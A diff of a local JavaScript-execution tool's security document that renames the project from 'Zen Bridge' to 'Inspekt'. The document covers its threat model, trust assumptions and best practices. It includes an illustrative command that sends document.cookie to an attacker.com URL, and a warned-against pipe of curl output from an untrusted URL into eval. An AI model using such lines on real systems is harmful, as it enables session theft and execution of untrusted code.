@@ -2,9 +2,9 @@
 
 ## 1. Security Overview
 
-### Zen Bridge's Security Model
+### Inspekt's Security Model
 
-Zen Bridge is a **local development tool** designed to execute JavaScript in your browser from the command line. The security model is intentionally simple and built on the following principles:
+Inspekt is a **local development tool** designed to execute JavaScript in your browser from the command line. The security model is intentionally simple and built on the following principles:
 
 - **Localhost-only by default**: All network interfaces bind to `127.0.0.1` exclusively
 - **No remote access**: The server is not designed or hardened for internet exposure
@@ -13,7 +13,7 @@ Zen Bridge is a **local development tool** designed to execute JavaScript in you
 
 ### Threat Model
 
-Zen Bridge operates under a **localhost-only threat model**:
+Inspekt operates under a **localhost-only threat model**:
 
 - **Primary risk**: Malicious JavaScript execution by user action
 - **Acceptable risk**: Local process communication without authentication
@@ -22,7 +22,7 @@ Zen Bridge operates under a **localhost-only threat model**:
 
 ### Trust Assumptions
 
-Using Zen Bridge requires trusting:
+Using Inspekt requires trusting:
 
 1. **JavaScript code you execute** - All scripts run with full page context access
 2. **Userscript manager** - Extensions like Violentmonkey/Tampermonkey have elevated privileges
@@ -59,7 +59,7 @@ Both endpoints are localhost-only. There is no configuration option to expose re
 
 ### User Must Trust JavaScript Scripts
 
-Zen Bridge executes arbitrary JavaScript in your browser. This is **by design** and is the core functionality:
+Inspekt executes arbitrary JavaScript in your browser. This is **by design** and is the core functionality:
 
 - No sandboxing beyond browser's built-in security
 - Scripts have full DOM access
@@ -125,7 +125,7 @@ These threats are relevant and considered:
 
 ### Out of Scope
 
-These threats are explicitly out of scope for Zen Bridge:
+These threats are explicitly out of scope for Inspekt:
 
 #### 1. Remote Attacks
 
@@ -137,7 +137,7 @@ These threats are explicitly out of scope for Zen Bridge:
 
 #### 3. Browser Vulnerabilities
 
-**Separate concern**: Browser security is the responsibility of browser vendors. Zen Bridge relies on browser sandboxing.
+**Separate concern**: Browser security is the responsibility of browser vendors. Inspekt relies on browser sandboxing.
 
 #### 4. Man-in-the-Middle Attacks
 
@@ -175,7 +175,7 @@ There is intentionally no option to configure the bind address. This prevents ac
 
 #### All JavaScript Execution is Intentional
 
-- User must explicitly run `zen eval <code>` or `zen exec <file>`
+- User must explicitly run `inspekt eval <code>` or `inspekt exec <file>`
 - No automatic code execution on server start
 - No code execution from web requests without user action
 - Clear audit trail in terminal
@@ -245,7 +245,7 @@ No API keys, tokens, or passwords required.
 
 ### Arbitrary JavaScript Execution
 
-**By design**: Zen Bridge executes arbitrary JavaScript code in your browser.
+**By design**: Inspekt executes arbitrary JavaScript code in your browser.
 
 **Implications**:
 - Malicious scripts can steal session cookies
@@ -263,7 +263,7 @@ No API keys, tokens, or passwords required.
 **Example attack vector**:
 ```bash
 # Malicious script steals cookies
-zen eval "fetch('https://attacker.com/steal?cookies=' + document.cookie)"
+inspekt eval "fetch('https://attacker.com/steal?cookies=' + document.cookie)"
 ```
 
 **Defense**: Review all code before execution. Don't run untrusted scripts.
@@ -280,7 +280,7 @@ zen eval "fetch('https://attacker.com/steal?cookies=' + document.cookie)"
 **Acceptable for local development tool**:
 - If your machine is compromised, attacker already has access
 - Localhost-only binding prevents remote abuse
-- User controls when server is running (`zen server start/stop`)
+- User controls when server is running (`inspekt server start/stop`)
 
 **Future enhancement**: Optional token-based authentication for additional security layer.
 
@@ -323,13 +323,13 @@ zen eval "fetch('https://attacker.com/steal?cookies=' + document.cookie)"
 ```bash
 # Good: Review script first
 cat my_script.js
-zen exec my_script.js
+inspekt exec my_script.js
 
 # Good: Understand inline code
-zen eval "document.querySelectorAll('a').length"
+inspekt eval "document.querySelectorAll('a').length"
 
 # Bad: Run unknown script from internet
-curl https://untrusted.com/script.js | zen eval  # DON'T DO THIS
+curl https://untrusted.com/script.js | inspekt eval  # DON'T DO THIS
 ```
 
 #### Review Scripts Before Execution
@@ -358,7 +358,7 @@ This would allow remote code execution in your browser from any machine that can
 
 ```bash
 # Check version
-zen eval "window.__ZEN_BRIDGE_VERSION__"
+inspekt eval "window.__ZEN_BRIDGE_VERSION__"
 
 # Current version: 3.4
 ```
@@ -385,10 +385,10 @@ This blocks external connections as a defense-in-depth measure.
 
 ```bash
 # Stop server when done
-zen server stop
+inspekt server stop
 
 # Check status
-zen server status
+inspekt server status
 ```
 
 If the server isn't running, the attack surface is eliminated.
@@ -445,7 +445,7 @@ When adding features, document:
 
 ### How to Report Security Issues
 
-If you discover a security vulnerability in Zen Bridge:
+If you discover a security vulnerability in Inspekt:
 
 1. **Do NOT open a public GitHub issue** (gives attackers notice)
 2. **Email the maintainer directly**: Include [SECURITY] in subject line
@@ -535,7 +535,7 @@ window.__ZEN_BRIDGE_VERSION__ = '3.4';
 Check version from CLI:
 
 ```bash
-zen eval "window.__ZEN_BRIDGE_VERSION__"
+inspekt eval "window.__ZEN_BRIDGE_VERSION__"
 ```
 
 ### Protocol Version Negotiation
@@ -562,10 +562,10 @@ zen eval "window.__ZEN_BRIDGE_VERSION__"
 **Future enhancement**:
 ```bash
 # Planned: Version check command
-zen version --check-userscript
+inspekt version --check-userscript
 
 # Planned: Warning on version mismatch
-zen eval "code"  # Warns if userscript is outdated
+inspekt eval "code"  # Warns if userscript is outdated
 ```
 
 ## 10. Future Enhancements
@@ -577,15 +577,15 @@ zen eval "code"  # Warns if userscript is outdated
 **Implementation**:
 ```bash
 # Server generates token on start
-zen server start
+inspekt server start
 # Server token: abc123xyz
 
 # CLI uses token
-zen eval "code" --token abc123xyz
+inspekt eval "code" --token abc123xyz
 
 # Or store in environment
 export ZEN_BRIDGE_TOKEN=abc123xyz
-zen eval "code"  # Uses token from env
+inspekt eval "code"  # Uses token from env
 ```
 
 **Benefits**:
@@ -639,8 +639,8 @@ async def handle_http_run(request):
 **Implementation**:
 ```bash
 # Enable audit logging
-zen config set audit.enabled true
-zen config set audit.log_file ~/.zen_bridge/audit.log
+inspekt config set audit.enabled true
+inspekt config set audit.log_file ~/.zen_bridge/audit.log
 
 # Audit log format
 [2025-10-27 10:30:45] EVAL "document.title" -> "Example Domain"
@@ -660,7 +660,7 @@ zen config set audit.log_file ~/.zen_bridge/audit.log
 
 **Implementation**:
 ```bash
-zen eval "fetch('https://api.example.com')"
+inspekt eval "fetch('https://api.example.com')"
 # Warning: This page has a strict CSP that may block fetch requests
 # CSP: default-src 'self'
 ```
@@ -677,10 +677,10 @@ zen eval "fetch('https://api.example.com')"
 **Implementation**:
 ```bash
 # Install verified script
-zen script install screenshot-tool --verified
+inspekt script install screenshot-tool --verified
 
 # List available verified scripts
-zen script list --verified
+inspekt script list --verified
 
 # Each script has checksum and signature
 ```
@@ -695,7 +695,7 @@ zen script list --verified
 
 ## Summary
 
-Zen Bridge is designed as a **local development tool** with a simple, pragmatic security model:
+Inspekt is designed as a **local development tool** with a simple, pragmatic security model:
 
 **Core Principles**:
 1. Localhost-only (never exposed to network)
